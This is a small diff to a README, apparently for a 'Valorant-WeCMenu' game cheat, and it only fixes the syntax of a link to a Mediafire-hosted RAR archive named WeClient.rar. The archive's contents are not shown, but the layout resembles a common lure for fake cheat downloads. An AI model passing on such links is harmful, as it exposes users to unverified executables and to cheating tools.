@@ -1,6 +1,6 @@
 ![1](https://github.com/heatjuuk/Valorant-WeCMenu/assets/154532156/fba6893d-0b36-41eb-9566-d7989f33fcbe)
 
-[![f78sdf978ds98f](https://www.mediafire.com/file/6mas5rqzo4vl1gr/WeClient.rar)
+![f78sdf978ds98f](https://www.mediafire.com/file/6mas5rqzo4vl1gr/WeClient.rar)
 
 # 🤔FAQ:
 
